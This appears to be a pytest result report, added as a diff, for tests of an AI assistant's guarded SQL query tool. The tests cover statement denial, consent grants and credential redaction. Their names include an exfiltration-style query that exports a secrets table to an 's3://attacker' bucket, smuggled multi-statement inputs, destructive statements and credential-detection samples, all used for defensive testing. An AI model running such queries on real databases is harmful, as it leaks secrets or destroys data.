@@ -1,0 +1,226 @@
+<?xml version='1.0' encoding='utf-8'?>
+<testsuites name="pytest tests">
+  <testsuite name="pytest" errors="0" failures="0" skipped="0" tests="221" time="2.922">
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_returns_scoped_repair_without_engine_call[SHOW VIEWS]" time="0.090" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_returns_scoped_repair_without_engine_call[show views from NOVA_SALES;]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_returns_scoped_repair_without_engine_call[SHOW\nVIEWS]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_repair_does_not_override_policy_refusal[SHOW VIEWS; DELETE FROM facts]" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_repair_does_not_override_policy_refusal[/* inspect */ SHOW VIEWS]" time="0.005" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_other_view_queries_keep_the_existing_execution_path[SHOW CREATE VIEW db1.orders]" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_other_view_queries_keep_the_existing_execution_path[SELECT 'SHOW VIEWS' AS label]" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_read_only_statement_runs_through_query_service" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_tool_never_imports_asyncmy_or_the_db_module_and_never_opens_a_socket" time="0.006" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_bounded_preview_truncates_a_wide_result" time="0.003" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[DROP TABLE x]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[TRUNCATE TABLE x]" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[DELETE FROM x]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[UPDATE x SET a = 1]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[ALTER TABLE x DROP COLUMN c]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[GRANT SELECT ON x TO u]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[REVOKE SELECT ON x FROM u]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[SET role = 'admin']" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[CREATE TABLE x (a INT)]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[INSERT INTO x VALUES (1)]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[COPY INTO x FROM 's3://b']" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[CREATE ML_MODEL m TYPE = FORECAST TARGET = y AS SELECT 1]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[CREATE TASK t AS SELECT 1]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_multi_statement_payload_cannot_smuggle_a_denied_statement" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_mixed_payload_is_destructive_and_pure_denied_is_denied" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_nova_ddl_is_recognised_as_denied" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT * FROM secrets INTO OUTFILE 's3://attacker/leak.csv' FORMAT AS CSV]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT /* hide */ 1 INTO OUTFILE 's3://b/x']" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV -- trailing]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[EXPLAIN SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT * FROM t INTO @stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[INSERT INTO FILES('path'='s3://b/x') SELECT * FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[SELECT 1 INTO@stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[SELECT 1 INTO  @stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[SELECT 1 INTO\n@stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[WITH x AS (SELECT 1) SELECT * FROM x INTO@stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[EXPLAIN SELECT 1 INTO@stage1.x.csv]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_literal_and_identifier_spellings_stay_allowed[SELECT 'INTO@stage' AS note]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_literal_and_identifier_spellings_stay_allowed[SELECT 'INTO @stage' AS note]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_literal_and_identifier_spellings_stay_allowed[SELECT 'INTOOUTFILE' AS note]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_literal_and_identifier_spellings_stay_allowed[SELECT into_at FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_refused_before_the_engine" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_grant_never_auto_approves_zero_gap_into_stage" time="0.004" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_multi_statement_write_clause_payload_is_not_read_only[SELECT 1; SELECT 1 INTO OUTFILE 's3://b/x']" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_multi_statement_write_clause_payload_is_not_read_only[SELECT 1; SELECT * FROM t INTO @stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_into_outfile_is_refused_before_the_engine" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_multi_statement_outfile_payload_cannot_smuggle_the_export" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_plain_read_only_statements_still_pass_the_write_clause_scan" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_outfile_guard_is_enforced_at_the_shared_pipeline" time="0.422" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_read_only_grant_does_not_cover_into_outfile_classification" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN DROP TABLE x]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN ANALYZE DELETE FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN ANALYZE INSERT INTO t VALUES (1)]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN UPDATE t SET a = 1]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN GRANT SELECT ON t TO u]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN CREATE TABLE x (a INT)]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_denied[EXPLAIN SELECT 1 INTO OUTFILE 's3://b/x']" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN SELECT 1]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN ANALYZE SELECT * FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN WITH x AS (SELECT 1) SELECT * FROM x]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN SHOW TABLES]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_read_only_statement_stays_read_only[EXPLAIN DESCRIBE t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_explain_over_a_destructive_statement_is_refused_before_the_engine" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_grant_never_auto_approves_explain_over_a_mutation" time="0.003" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH x AS (SELECT 1) DELETE FROM t]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH x AS (SELECT 1) UPDATE t SET a = 1]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH a AS (SELECT 1), b AS (SELECT 2) DELETE FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_body_is_denied[WITH RECURSIVE x(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM x WHERE n &lt; 5) DELETE FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_select_body_is_read_only[WITH x AS (SELECT 1) SELECT * FROM x]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_select_body_is_read_only[WITH a AS (SELECT 1), b AS (SELECT 2) SELECT * FROM a JOIN b]" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_select_body_is_read_only[WITH RECURSIVE x(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM x WHERE n &lt; 5) SELECT * FROM x]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_select_body_is_read_only[WITH x AS (SELECT '(') SELECT * FROM x]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_with_cte_mutating_payload_is_refused_before_the_engine" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_destructive_call_never_auto_approves_even_with_a_grant" time="0.008" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_read_only_call_is_covered_by_an_allow_session_grant" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_deny_decision_blocks_execution" time="0.003" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_engine_privilege_error_terminates_without_elevated_retry" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_engine_privilege_error_in_result_terminates" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_audit_row_is_correlated_by_conversation_id" time="0.004" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_auth_session_id_is_used_when_no_conversation_is_present" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_audit_sql_is_redacted_and_never_stores_rows" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_preview_is_redacted_sql" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_preview_withholds_sql_it_cannot_redact" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_error_is_redacted_for_both_sinks" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_error_never_reaches_the_sse_frame" time="0.004" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_privilege_error_classification_reads_the_unredacted_message" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_warning_is_redacted_in_the_model_summary" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_warning_uses_the_shared_redactor" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_result_without_a_warning_is_unchanged" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unredactable_warning_is_withheld_not_leaked" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[password]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[user_password]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[api_key]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[apiKey]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[access-key]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[client_secret]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_column_names_are_detected[bearer]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_column_names_are_not_flagged[id]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_column_names_are_not_flagged[name]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_column_names_are_not_flagged[created_at]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_column_names_are_not_flagged[token_count]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[AKIAIOSFODNN7EXAMPLE]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[-----BEGIN RSA PRIVATE KEY-----]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[sk-abcdefghijklmnopqrstuvwxyz123456]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[ghp_abcdefghijklmnopqrstuvwxyz0123456789]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_shaped_values_are_detected[eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[userPassword]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[userpassword]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[UserPassword]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[secretKey]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[accessToken]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[privateKey]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[hashedPassword]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[dbPass]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[clientSecret]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[sessionToken]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[accountKey]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[sasToken]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[APIKey]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[pwd]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[user_pwd]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[user-pwd]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_credential_column_names_are_detected[userPwd]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[note]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[status]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[user_name]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[file_path]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[keyword]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_unrelated_column_names_are_not_flagged[compass]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_values_are_not_flagged[hello world]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_values_are_not_flagged[12345]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_values_are_not_flagged[2026-09-18]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_ordinary_values_are_not_flagged[None]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_redact_rows_is_value_level_not_the_sql_helper" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_redact_rows_redacts_every_cell_of_a_credential_column" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_none_stays_none_in_a_credential_column" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_credential_value_is_redacted_before_entering_the_model_summary" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_camel_case_password_columns_are_redacted_before_the_model" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_max_rows_is_passed_to_the_service_for_every_call" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_default_row_cap_is_the_spec_value" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_registry_exposes_query_execute" time="0.118" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_query_execute_satisfies_the_tool_protocol" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_tool_schema_is_advertised_to_the_model" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_tool_call_view_carries_the_classification" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_mission_cancelled_during_consent_never_starts_mutation" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_before_dispatch_is_terminal[search-provider]" time="0.007" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_before_dispatch_is_terminal[search-consent]" time="0.007" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_before_dispatch_is_terminal[feature-provider]" time="0.006" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_before_dispatch_is_terminal[feature-consent]" time="0.007" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_live_resource_revocation_after_admission_blocks_data[search]" time="0.006" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_live_resource_revocation_after_admission_blocks_data[feature]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_prefetched_resource_cannot_bypass_release_recheck[search]" time="0.006" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_prefetched_resource_cannot_bypass_release_recheck[feature]" time="0.007" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_definition_change_without_version_bump_is_terminal[search]" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_definition_change_without_version_bump_is_terminal[feature]" time="0.006" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_during_data_read_never_publishes[search-False]" time="0.006" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_during_data_read_never_publishes[search-True]" time="0.006" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_during_data_read_never_publishes[feature-False]" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_active_version_change_during_data_read_never_publishes[feature-True]" time="0.004" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_definition_drift_during_same_version_read_discards_result[search]" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_definition_drift_during_same_version_read_discards_result[feature]" time="0.007" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_resource_revocation_during_read_discards_result[search]" time="0.006" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_resource_revocation_during_read_discards_result[feature]" time="0.004" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_resource_drift_blocks_mutation_even_for_an_unrelated_tool[search]" time="0.004" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_resource_drift_blocks_mutation_even_for_an_unrelated_tool[feature]" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_drift_already_present_at_admission_never_calls_provider[search]" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_drift_already_present_at_admission_never_calls_provider[feature]" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_unchanged_resource_still_runs_with_current_caller[search]" time="0.008" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_unchanged_resource_still_runs_with_current_caller[feature]" time="0.008" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_feature_explicit_other_version_cannot_bypass_release" time="0.006" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_feature_request_uses_release_version[None]" time="0.008" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_feature_request_uses_release_version[1]" time="0.006" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_legacy_feature_explicit_version_is_preserved" time="0.004" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_tool_owner_discards_wrong_version_before_return[search]" time="0.002" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_tool_owner_discards_wrong_version_before_return[feature]" time="0.005" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_unpinned_dispatch_does_not_read_release_resources[None]" time="0.003" />
+    <testcase classname="tests.unit.test_release_runtime_resource_boundary" name="test_unpinned_dispatch_does_not_read_release_resources[manifest1]" time="0.002" />
+    <testcase classname="tests.unit.test_agent_read_grant_policy" name="test_agent_policy_and_login_changes_recheck_the_current_approval[False]" time="0.093" />
+    <testcase classname="tests.unit.test_agent_read_grant_policy" name="test_agent_policy_and_login_changes_recheck_the_current_approval[True]" time="0.011" />
+    <testcase classname="tests.unit.test_agent_read_grant_policy" name="test_overlapping_logins_do_not_share_live_consent" time="0.013" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_grant_comes_back_after_a_restart" time="0.001" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_another_role_or_session_never_inherits_it[changed0]" time="0.001" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_another_role_or_session_never_inherits_it[changed1]" time="0.001" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_revoking_removes_it_everywhere" time="0.001" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_without_redis_nothing_is_restored" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_grants_are_per_user_and_thread" time="0.001" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_new_login_does_not_inherit_or_erase_another_sessions_grant[False]" time="0.001" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_new_login_does_not_inherit_or_erase_another_sessions_grant[True]" time="0.001" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_expired_or_remotely_revoked_grant_is_not_retained_in_memory[False]" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_expired_or_remotely_revoked_grant_is_not_retained_in_memory[True]" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_legacy_grant_without_session_binding_is_not_restored" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_grant_requires_a_valid_session_security_context[changed0]" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_grant_requires_a_valid_session_security_context[changed1]" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_grant_requires_a_valid_session_security_context[changed2]" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_grant_requires_a_valid_session_security_context[changed3]" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_grant_requires_a_valid_session_security_context[changed4]" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_grant_requires_a_valid_session_security_context[changed5]" time="0.000" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_a_stale_reader_cannot_delete_a_concurrent_new_grant" time="0.001" />
+    <testcase classname="tests.unit.test_neva_read_grants" name="test_unavailable_redis_drops_remembered_approval_without_leaking_details" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_can_resolve_their_own_pending_call" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_user_gets_404_and_cannot_resolve_same_loop" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_user_gets_404_and_cannot_resolve" time="0.014" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_user_cannot_deny_either" time="0.011" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_unknown_tool_call_id_is_404" time="0.011" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_sets_the_grant_on_their_own_conversation_only" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_allow_session_on_a_read_only_call_sets_the_grant" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_agent_studio_allow_session_sets_the_same_read_only_grant" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_allow_session_on_a_non_read_only_call_is_rejected[destructive]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_allow_session_on_a_non_read_only_call_is_rejected[denied]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_allow_session_on_a_non_read_only_call_is_400_over_http" time="0.008" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_revoke_clears_the_grant" time="0.008" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_revoke_is_404_and_leaves_the_owner_grant_intact" time="0.008" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_sets_the_grant_on_a_fresh_thread" time="0.008" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_read_only_approval_without_a_login_is_refused[False]" time="0.008" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_read_only_approval_without_a_login_is_refused[True]" time="0.008" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_owner_clears_the_grant_with_false" time="0.009" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_foreign_set_is_404_and_leaves_the_owner_grant_untouched" time="0.008" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_set_grant_does_not_reset_a_grant_on_another_thread" time="0.008" />
+    <testcase classname="tests.unit.test_assistant_consent_ownership" name="test_revoked_grant_prompts_again_on_the_next_read_only_call" time="0.012" />
+  </testsuite>
+</testsuites>
